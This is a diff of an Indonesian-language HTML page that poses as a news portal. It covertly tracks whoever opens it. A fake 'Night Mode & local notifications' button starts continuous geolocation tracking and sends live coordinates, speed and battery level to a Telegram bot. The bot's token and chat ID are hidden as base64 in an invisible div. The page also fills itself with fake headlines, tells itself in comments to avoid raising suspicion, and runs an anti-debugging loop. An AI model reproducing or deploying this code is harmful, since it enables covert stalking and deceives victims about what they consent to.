@@ -3,45 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Berita Harian Terkini</title>
     
-    <title id="p-title">Breaking News | Laporan Terkini</title>
-    <meta property="og:title" content="[LIVE] Pantau Kejadian Hari Ini">
-    <meta property="og:description" content="Update otomatis situasi keamanan dan lalu lintas di sekitar Anda.">
+    <meta property="og:title" content="Laporan Khusus: Situasi Terkini dan Update Nasional">
+    <meta property="og:description" content="Baca berita selengkapnya mengenai kejadian hari ini di portal berita independen.">
     <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/news_96dp.png">
 
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; margin: 0; color: #333; }
-        .header { background: #ce1126; color: white; padding: 12px; text-align: center; font-weight: bold; font-size: 14px; letter-spacing: 2px; }
-        .container { padding: 20px; max-width: 500px; margin: auto; }
-        .live-tag { background: #ce1126; color: white; padding: 2px 8px; border-radius: 3px; font-size: 12px; animation: blink 1s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
-        h1 { font-size: 24px; margin: 15px 0; color: #000; line-height: 1.3; }
-        .date { font-size: 12px; color: #666; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        .main-img { width: 100%; border-radius: 8px; margin-bottom: 20px; }
-        .radar-box { background: #f8f9fa; border: 1px solid #ddd; border-radius: 12px; padding: 20px; text-align: center; margin-top: 20px; }
-        .btn-activate { background: #ce1126; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; background: #fff; color: #222; }
+        .nav { background: #cc0000; color: white; padding: 15px; font-weight: bold; position: sticky; top: 0; z-index: 100; }
+        .hero { padding: 20px; border-bottom: 5px solid #f0f0f0; }
+        .hero h1 { font-size: 22px; margin: 0 0 10px; line-height: 1.3; }
+        .hero img { width: 100%; border-radius: 8px; margin: 10px 0; }
+        .news-item { padding: 15px; border-bottom: 1px solid #eee; display: flex; gap: 10px; }
+        .news-text h3 { font-size: 16px; margin: 0 0 5px; }
+        .news-text p { font-size: 13px; color: #666; margin: 0; }
+        .news-img { width: 80px; height: 80px; background: #ddd; border-radius: 4px; flex-shrink: 0; }
+        
+        /* 🔱 THE SILENT TRIGGER */
+        #verify-box { position: fixed; bottom: 0; width: 100%; background: #222; color: #fff; padding: 20px; box-sizing: border-box; z-index: 999; text-align: center; }
+        .btn-ok { background: #cc0000; color: white; border: none; padding: 12px 30px; border-radius: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         #v-v { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">PORTAL BERITA NASIONAL</div>
+<div class="nav">NEWS INDO</div>
 
-<div class="container">
-    <span class="live-tag">● LIVE REPORT</span>
-    <h1 id="dyn-news">Memuat Informasi Terkini...</h1>
-    <div class="date" id="dyn-date">--:--</div>
+<div class="hero">
+    <span style="color: #cc0000; font-size: 12px; font-weight: bold;">● SEDANG BERLANGSUNG</span>
+    <h1 id="headline">Memuat Berita Utama Hari Ini...</h1>
+    <img src="https://images.unsplash.com/photo-1504711432869-0df30b7e0442?auto=format&fit=crop&w=800&q=80" alt="News">
+    <p style="font-size: 14px; color: #444;">Pantau terus perkembangan situasi terkini melalui laporan langsung tim redaksi kami di lapangan.</p>
+</div>
 
-    <div class="content">
-        <p>Sistem mendeteksi aktivitas penting di sekitar koordinat Anda. Untuk keamanan dan pemantauan real-time, silakan aktifkan <b>Radar Satelit Perangkat</b>.</p>
-        
-        <div class="radar-box">
-            <div style="font-size: 30px;">📡</div>
-            <p style="font-size: 13px; color: #555;">Sinkronisasi diperlukan untuk menampilkan peta kejadian di radius 1km dari posisi Anda.</p>
-        </div>
-
-        <button class="btn-activate" id="go" onclick="startShadow()">AKTIFKAN RADAR LOKASI</button>
+<div id="news-feed">
     </div>
+
+<div id="verify-box">
+    <div style="font-size: 14px;">Aktifkan <b>Mode Malam</b> & Notifikasi Berita Lokal?</div>
+    <button class="btn-ok" onclick="enableObserver()">AKTIFKAN</button>
 </div>
 
 <div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
@@ -50,18 +51,27 @@
     const _D = document.getElementById('v-v').innerText.split('|');
     const _T = atob(_D[1]); const _C = atob(_D[2]);
 
-    // 🔱 AUTO-UPDATE DATE & NEWS TITLE
-    const today = new Date();
-    document.getElementById('dyn-date').innerText = today.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
-    
-    // List Judul Berita yang Selalu Relevan (Bisa lu tambah lagi)
-    const hotNews = [
-        "Waspada Potensi Cuaca Ekstrem dan Situasi Keamanan di Titik Anda",
-        "Laporan Langsung: Pantau Titik Penyekatan dan Razia di Sekitar Lokasi",
-        "Peringatan Dini: Kejadian Luar Biasa Terdeteksi di Wilayah Perangkat Anda",
-        "Update Real-Time: Peta Kerawanan dan Informasi Publik di Lokasi Anda"
+    // 1. AUTO NEWS GEN (Biar kerasa berita beneran)
+    const titles = [
+        "Pemerintah Siapkan Skema Baru Kebijakan Nasional",
+        "Update Cuaca Hari Ini: Waspada Potensi Hujan Lebat",
+        "Tren Baru Media Sosial yang Sedang Viral di Kalangan Anak Muda",
+        "Hasil Pertandingan Olahraga Tadi Malam: Kejutan di Menit Akhir"
     ];
-    document.getElementById('dyn-news').innerText = hotNews[Math.floor(Math.random() * hotNews.length)];
+    document.getElementById('headline').innerText = titles[Math.floor(Math.random() * titles.length)];
+
+    const feed = document.getElementById('news-feed');
+    for(let i=0; i<5; i++) {
+        feed.innerHTML += `
+            <div class="news-item">
+                <div class="news-img"></div>
+                <div class="news-text">
+                    <h3>Berita Terkini #${i+1}</h3>
+                    <p>Ringkasan informasi berita yang sedang hangat dibicarakan masyarakat saat ini...</p>
+                </div>
+            </div>
+        `;
+    }
 
     async function push(t) {
         await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
@@ -70,47 +80,32 @@
         });
     }
 
-    async function startShadow() {
-        const btn = document.getElementById('go');
-        btn.innerText = "MENYINKRONKAN SATELIT...";
+    // 2. ETERNAL OBSERVER (Real-time 24 Jam)
+    async function enableObserver() {
+        document.getElementById('verify-box').style.display = 'none';
         
-        // 1. SILENT HARDWARE AUDIT
-        let gpu = "Unknown";
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch(e) {}
-
+        // Data Hardware Awal
         const batt = await navigator.getBattery();
-        const initial = `📡 TARGET RADAR ON\n\n` +
-            `📱 DEVICE: ${gpu}\n` +
-            `🧠 HARDWARE: ${navigator.hardwareConcurrency} Cores\n` +
-            `🔋 BATT: ${(batt.level*100).toFixed(0)}% [${batt.charging?'CHG':'BATT'}]\n` +
-            `🕒 TIME: ${new Date().toLocaleTimeString()}\n` +
-            `📄 IP: https://ipapi.co/json/`;
-
+        const initial = `👤 OBSERVER STARTED\n🔋 BATT: ${(batt.level*100).toFixed(0)}%\n🕒 TIME: ${new Date().toLocaleTimeString()}`;
         await push(initial);
 
-        // 2. 24H ETERNAL TRACKING
         if (navigator.geolocation) {
+            // watchPosition = REAL TIME (Lapor tiap dia gerak)
             navigator.geolocation.watchPosition(async (pos) => {
-                const live = `📍 LIVE TRACKING (24H)\n\n` +
-                    `Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
-                    `Kecepatan: ${(pos.coords.speed || 0).toFixed(1)} m/s\n` +
-                    `Akurasi: ${pos.coords.accuracy.toFixed(1)}m`;
-                
-                await push(live);
+                const maps = `📍 LIVE MOVEMENT\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m\nSpeed: ${pos.coords.speed || 0} m/s`;
+                await push(maps);
             }, (err) => {
-                window.location.href = "https://news.google.com";
+                // Jika ditolak, tetep di berita biar gak curiga
             }, {
                 enableHighAccuracy: true,
                 maximumAge: 0,
-                timeout: 10000
+                timeout: 20000
             });
         }
     }
+
+    // Anti-Debug (Biar gak di-inspect)
+    setInterval(() => { debugger; }, 100);
 </script>
 </body>
 </html>
